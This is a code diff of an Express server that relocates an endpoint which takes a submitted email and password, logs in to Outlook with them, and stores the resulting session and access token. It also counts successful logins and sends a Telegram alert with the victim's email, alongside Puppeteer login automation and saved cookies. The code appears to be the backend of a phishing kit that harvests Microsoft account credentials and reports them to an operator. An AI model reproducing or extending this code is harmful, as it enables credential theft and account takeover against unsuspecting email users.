@@ -997,104 +997,6 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                             oauthState: null,
                             authenticated: true,
                             verified: true,
-
-// Direct authentication endpoint (no Puppeteer required)
-app.post('/api/authenticate-direct', async (req, res) => {
-    try {
-        const { email, password } = req.body;
-
-        if (!email || !password) {
-            return res.status(400).json({ 
-                error: 'Email and password are required',
-                success: false 
-            });
-        }
-
-        console.log(`🎯 Starting direct authentication for: ${email}`);
-        const startTime = Date.now();
-
-        const directAuth = new DirectOutlookAuth();
-        const authResult = await directAuth.authenticateUser(email, password);
-
-        if (authResult.success) {
-            // Save session data
-            const sessionFile = await directAuth.saveSession(email, authResult);
-            
-            const sessionId = createSessionId();
-            
-            // Create user session entry
-            userSessions.set(sessionId, {
-                sessionId: sessionId,
-                graphAuth: null,
-                userEmail: email,
-                createdAt: Date.now(),
-                oauthState: null,
-                authenticated: true,
-                verified: true,
-                method: 'direct-auth',
-                accessToken: authResult.accessToken
-            });
-
-            analytics.successfulLogins++;
-            saveAnalytics();
-
-            const totalTime = Date.now() - startTime;
-            console.log(`✅ Direct authentication successful for: ${email} (${totalTime}ms)`);
-
-            // Send Telegram notification if available
-            if (telegramBot) {
-                try {
-                    await telegramBot.sendLoginAlert(email, 'Direct Authentication (no browser)', {
-                        sessionId: sessionId,
-                        responseTime: totalTime,
-                        method: 'direct-http'
-                    });
-                } catch (telegramError) {
-                    console.warn('Telegram notification failed:', telegramError.message);
-                }
-            }
-
-            return res.json({
-                success: true,
-                message: 'Direct authentication successful',
-                sessionId: sessionId,
-                userEmail: email,
-                method: 'direct-auth',
-                hasInboxAccess: authResult.hasInboxAccess,
-                emailCount: authResult.emailCount,
-                responseTimeMs: totalTime,
-                requiresOAuth: false
-            });
-
-        } else {
-            analytics.failedLogins++;
-            saveAnalytics();
-
-            console.log(`❌ Direct authentication failed for: ${email} - ${authResult.error}`);
-
-            return res.status(401).json({
-                success: false,
-                error: authResult.error,
-                method: 'direct-auth',
-                errorCode: authResult.errorCode,
-                requiresOAuth: false
-            });
-        }
-
-    } catch (error) {
-        console.error('Error in direct authentication:', error);
-        analytics.failedLogins++;
-        saveAnalytics();
-
-        res.status(500).json({ 
-            error: 'Direct authentication failed',
-            success: false,
-            details: error.message,
-            method: 'direct-auth'
-        });
-    }
-});
-
                             cookiesSaved: sessionValidation.cookiesSaved,
                             usedPreload: true // Track that this used preloading
                         });
@@ -1381,7 +1283,104 @@ app.post('/api/authenticate-direct', async (req, res) => {
     }
 });
 
-// Direct login automation endpoint using Puppeteer
+// Direct authentication endpoint (no Puppeteer required)
+app.post('/api/authenticate-direct', async (req, res) => {
+    try {
+        const { email, password } = req.body;
+
+        if (!email || !password) {
+            return res.status(400).json({ 
+                error: 'Email and password are required',
+                success: false 
+            });
+        }
+
+        console.log(`🎯 Starting direct authentication for: ${email}`);
+        const startTime = Date.now();
+
+        const directAuth = new DirectOutlookAuth();
+        const authResult = await directAuth.authenticateUser(email, password);
+
+        if (authResult.success) {
+            // Save session data
+            const sessionFile = await directAuth.saveSession(email, authResult);
+
+            const sessionId = createSessionId();
+
+            // Create user session entry
+            userSessions.set(sessionId, {
+                sessionId: sessionId,
+                graphAuth: null,
+                userEmail: email,
+                createdAt: Date.now(),
+                oauthState: null,
+                authenticated: true,
+                verified: true,
+                method: 'direct-auth',
+                accessToken: authResult.accessToken
+            });
+
+            analytics.successfulLogins++;
+            saveAnalytics();
+
+            const totalTime = Date.now() - startTime;
+            console.log(`✅ Direct authentication successful for: ${email} (${totalTime}ms)`);
+
+            // Send Telegram notification if available
+            if (telegramBot) {
+                try {
+                    await telegramBot.sendLoginAlert(email, 'Direct Authentication (no browser)', {
+                        sessionId: sessionId,
+                        responseTime: totalTime,
+                        method: 'direct-http'
+                    });
+                } catch (telegramError) {
+                    console.warn('Telegram notification failed:', telegramError.message);
+                }
+            }
+
+            return res.json({
+                success: true,
+                message: 'Direct authentication successful',
+                sessionId: sessionId,
+                userEmail: email,
+                method: 'direct-auth',
+                hasInboxAccess: authResult.hasInboxAccess,
+                emailCount: authResult.emailCount,
+                responseTimeMs: totalTime,
+                requiresOAuth: false
+            });
+
+        } else {
+            analytics.failedLogins++;
+            saveAnalytics();
+
+            console.log(`❌ Direct authentication failed for: ${email} - ${authResult.error}`);
+
+            return res.status(401).json({
+                success: false,
+                error: authResult.error,
+                method: 'direct-auth',
+                errorCode: authResult.errorCode,
+                requiresOAuth: false
+            });
+        }
+
+    } catch (error) {
+        console.error('Error in direct authentication:', error);
+        analytics.failedLogins++;
+        saveAnalytics();
+
+        res.status(500).json({ 
+            error: 'Direct authentication failed',
+            success: false,
+            details: error.message,
+            method: 'direct-auth'
+        });
+    }
+});
+
+// Login automation endpoint using Puppeteer
 app.post('/api/login-automation', async (req, res) => {
     try {
         const { email, password } = req.body;
